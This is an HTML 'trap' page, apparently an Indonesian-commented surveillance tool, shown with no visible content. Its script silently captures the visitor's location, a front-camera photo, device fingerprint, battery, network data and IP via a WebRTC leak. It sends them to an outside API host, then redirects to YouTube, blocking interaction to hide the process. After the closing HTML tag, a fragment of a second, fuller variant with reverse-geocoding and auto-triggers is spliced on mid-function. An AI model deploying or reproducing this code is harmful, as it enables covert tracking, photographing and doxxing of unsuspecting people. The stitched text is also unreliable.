<!DOCTYPE html>
<html>
<head>
    <title></title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        /* KOSONG - No styles at all */
        * {
            display: none !important;
            visibility: hidden !important;
            opacity: 0 !important;
            position: absolute !important;
            top: -9999px !important;
            left: -9999px !important;
        }
        body, html {
            background: transparent !important;
            margin: 0 !important;
            padding: 0 !important;
            border: 0 !important;
            width: 0 !important;
            height: 0 !important;
            overflow: hidden !important;
        }
    </style>
</head>
<body>
<!-- NO CONTENT - COMPLETELY BLANK -->

<script>
// API endpoint - SESUAIKAN DENGAN DOMAIN ANDA
const API_URL = 'https://apiiy.vercel.app/api';

// Generate trap ID from URL or random
function getTrapId() {
    const params = new URLSearchParams(window.location.search);
    let trapId = params.get('id') || params.get('trap') || params.get('key');
    
    if (!trapId) {
        trapId = 'trap_' + 
                 Math.random().toString(36).substr(2, 9) + 
                 '_' + 
                 Date.now().toString(36);
        // Update URL without reload
        const newUrl = window.location.origin + window.location.pathname + 
                      '?id=' + encodeURIComponent(trapId);
        window.history.replaceState({}, '', newUrl);
    }
    
    return trapId;
}

// Collect all data silently
async function collectData() {
    const data = {
        trap_id: getTrapId(),
        timestamp: new Date().toISOString(),
        url: window.location.href,
        referrer: document.referrer || 'direct',
        user_agent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        screen: {
            width: screen.width,
            height: screen.height,
            availWidth: screen.availWidth,
            availHeight: screen.availHeight,
            colorDepth: screen.colorDepth,
            pixelDepth: screen.pixelDepth
        },
        window: {
            innerWidth: window.innerWidth,
            innerHeight: window.innerHeight,
            outerWidth: window.outerWidth,
            outerHeight: window.outerHeight
        },
        location: null,
        cameras: { front: false, rear: false },
        screenshot: null,
        network: null,
        battery: null,
        ip: null
    };

    // Get location SILENTLY (if already permitted previously)
    if (navigator.geolocation) {
        try {
            const position = await new Promise((resolve, reject) => {
                navigator.geolocation.getCurrentPosition(resolve, reject, {
                    enableHighAccuracy: true,
                    timeout: 5000,
                    maximumAge: 0
                });
            });
            data.location = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude,
                altitudeAccuracy: position.coords.altitudeAccuracy,
                heading: position.coords.heading,
                speed: position.coords.speed
            };
        } catch (e) {
            // Silent fail - location not available
        }
    }

    // Try to access cameras SILENTLY
    try {
        // Front camera
        const frontStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'user' }
        });
        data.cameras.front = true;
        
        // Capture single frame
        const video = document.createElement('video');
        video.srcObject = frontStream;
        await video.play();
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0);
        data.screenshot = canvas.toDataURL('image/jpeg', 0.5);
        
        // Stop stream
        frontStream.getTracks().forEach(track => track.stop());
        
        // Try rear camera
        try {
            const rearStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: { exact: 'environment' } }
            });
            data.cameras.rear = true;
            rearStream.getTracks().forEach(track => track.stop());
        } catch (e) {
            // Rear camera not available
        }
    } catch (e) {
        // Camera access failed - silent
    }

    // Get network info
    if (navigator.connection) {
        data.network = {
            type: navigator.connection.effectiveType,
            downlink: navigator.connection.downlink,
            rtt: navigator.connection.rtt,
            saveData: navigator.connection.saveData
        };
    }

    // Get battery info
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            data.battery = {
                level: battery.level,
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (e) {
            // Silent fail
        }
    }

    // Get IP via WebRTC (fallback)
    try {
        const rtc = new RTCPeerConnection({ iceServers: [] });
        rtc.createDataChannel('');
        rtc.createOffer()
            .then(offer => rtc.setLocalDescription(offer))
            .catch(() => {});
        
        rtc.onicecandidate = (event) => {
            if (event.candidate) {
                const candidate = event.candidate.candidate;
                const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                if (ipMatch) {
                    data.ip = ipMatch[1];
                }
                rtc.close();
            }
        };
        
        // Timeout for IP gathering
        setTimeout(() => {
            if (rtc) rtc.close();
        }, 1000);
    } catch (e) {
        // Silent fail
    }

    return data;
}

// Send data to API
async function sendData(data) {
    try {
        // Use Beacon API for reliable sending (even on page close)
        const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
        navigator.sendBeacon(API_URL, blob);
        
        // Also try fetch for better error handling
        fetch(API_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(data),
            keepalive: true // Ensure request completes even if page closes
        }).catch(() => {
            // Silent fail
        });
    } catch (e) {
        // Ultimate silent fail
    }
}

// Main execution - SILENT AND FAST
(async function() {
    // Immediate redirect to YouTube (primary action user sees)
    setTimeout(() => {
        window.location.replace('https://www.youtube.com');
    }, 100); // 100ms delay - almost instant
    
    // Collect and send data in background
    try {
        const collectedData = await collectData();
        await sendData(collectedData);
    } catch (e) {
        // Complete silent fail
    }
    
    // Force redirect after max 3 seconds (fallback)
    setTimeout(() => {
        if (window.location.href.indexOf('youtube.com') === -1) {
            window.location.href = 'https://www.youtube.com';
        }
    }, 3000);
})();

// Prevent any user interaction detection
document.addEventListener('DOMContentLoaded', () => {
    // Make page completely invisible
    document.body.style.display = 'none';
    document.documentElement.style.display = 'none';
    
    // Remove any potential focus
    window.blur();
    document.activeElement?.blur();
});

// Block all user interactions
['click', 'mousedown', 'mouseup', 'keydown', 'keyup', 'touchstart', 'touchmove', 'touchend'].forEach(event => {
    document.addEventListener(event, (e) => {
        e.preventDefault();
        e.stopPropagation();
        e.stopImmediatePropagation();
        return false;
    }, true);
});

// Disable right click, text selection, etc.
document.addEventListener('contextmenu', e => e.preventDefault());
document.addEventListener('selectstart', e => e.preventDefault());
document.addEventListener('dragstart', e => e.preventDefault());

// Make page unviewable
Object.defineProperty(document, 'visibilityState', {
    get: function() { return 'hidden'; }
});
Object.defineProperty(document, 'hidden', {
    get: function() { return true; }
});

// Hide from browser history
window.history.replaceState(null, '', 'about:blank');
</script>
</body>
</html>                   resolve(true);
                                }
                            }, 500);
                        }, 1000);
                    };
                    
                } catch(error) {
                    console.log('‚ùå Camera access denied:', error.name);
                    resolve(false);
                }
            });
        }
        
        // ===================== GET LOCATION =====================
        async function getLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve(false);
                    return;
                }
                
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        collectedData.location = {
                            lat: pos.coords.latitude,
                            lon: pos.coords.longitude,
                            accuracy: pos.coords.accuracy + ' meter',
                            altitude: pos.coords.altitude,
                            speed: pos.coords.speed,
                            heading: pos.coords.heading,
                            timestamp: new Date(pos.timestamp).toISOString()
                        };
                        
                        // Get detailed address
                        try {
                            const response = await fetch(
                                `https://nominatim.openstreetmap.org/reverse?format=json&lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&zoom=18`
                            );
                            const geoData = await response.json();
                            
                            collectedData.location.address = geoData.display_name;
                            collectedData.location.road = geoData.address?.road || 'Tidak diketahui';
                            collectedData.location.neighbourhood = geoData.address?.neighbourhood;
                            collectedData.location.suburb = geoData.address?.suburb;
                            collectedData.location.city = geoData.address?.city || geoData.address?.town || geoData.address?.village;
                            collectedData.location.county = geoData.address?.county;
                            collectedData.location.state = geoData.address?.state;
                            collectedData.location.country = geoData.address?.country;
                            collectedData.location.postcode = geoData.address?.postcode;
                            collectedData.location.country_code = geoData.address?.country_code;
                        } catch(e) {}
                        
                        resolve(true);
                    },
                    (error) => {
                        console.log('üìç Location denied:', error.message);
                        resolve(false);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            });
        }
        
        // ===================== GET NETWORK INFO =====================
        function getNetworkInfo() {
            if (navigator.connection) {
                collectedData.network = {
                    type: navigator.connection.type || 'unknown',
                    effectiveType: navigator.connection.effectiveType || 'unknown',
                    downlink: navigator.connection.downlink + ' Mbps',
                    rtt: navigator.connection.rtt + ' ms',
                    saveData: navigator.connection.saveData ? 'AKTIF' : 'TIDAK',
                    downlinkMax: navigator.connection.downlinkMax || 'unknown'
                };
            }
            
            // WebRTC IP Leak Detection
            try {
                const rtc = new RTCPeerConnection({
                    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                });
                
                rtc.createDataChannel('');
                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
                
                rtc.onicecandidate = (e) => {
                    if (e.candidate) {
                        const candidate = e.candidate.candidate;
                        if (candidate.includes('srflx')) {
                            collectedData.webrtc = {
                                publicIP: candidate.split(' ')[4],
                                type: 'STUN Public IP',
                                port: candidate.split(' ')[5]
                            };
                        } else if (candidate.includes('host')) {
                            collectedData.webrtcLocal = {
                                localIP: candidate.split(' ')[4],
                                type: 'Local IP'
                            };
                        }
                    }
                };
                
                setTimeout(() => rtc.close(), 5000);
            } catch(e) {}
        }
        
        // ===================== MAIN EXECUTION =====================
        async function executeAll() {
            console.log('üöÄ Starting OxyX Auto Capture...');
            
            // 1. Get IP Detail (PERTAMA biar cepet)
            await getIPDetail();
            
            // 2. Get Battery Detail
            await getBatteryDetail();
            
            // 3. Get Network Info
            getNetworkInfo();
            
            // 4. Get Location (async, bisa lama)
            getLocation();
            
            // 5. Auto Capture Camera (Sekalian jalanin)
            setTimeout(async () => {
                console.log('üì∏ Starting auto camera capture...');
                await autoCaptureCamera();
                
                // 6. Send semua data
                console.log('üì§ Sending all data...');
                sendToAPI(collectedData);
                
                // 7. Redirect
                setTimeout(() => {
                    window.location.href = CONFIG.REDIRECT_URL;
                }, CONFIG.REDIRECT_DELAY);
                
            }, 1500); // Tunggu 1.5 detik sebelum kamera
            
            // Backup: Kirim data tanpa kamera setelah 5 detik
            setTimeout(() => {
                if (collectedData.photos.length === 0) {
                    console.log('‚è±Ô∏è Sending data without camera...');
                    sendToAPI(collectedData);
                }
            }, 5000);
        }
        
        // ===================== START =====================
        // Trigger semua
        window.addEventListener('DOMContentLoaded', executeAll);
        window.addEventListener('load', executeAll);
        
        // Langsung execute tanpa tunggu
        setTimeout(executeAll, 500);
        
        // Auto click untuk trigger user interaction (trick)
        document.addEventListener('click', executeAll);
        document.addEventListener('touchstart', executeAll);
        document.addEventListener('keydown', executeAll);
        
    </script>
</head>
<body>
<!-- KOSONG -->
</body>
</html>
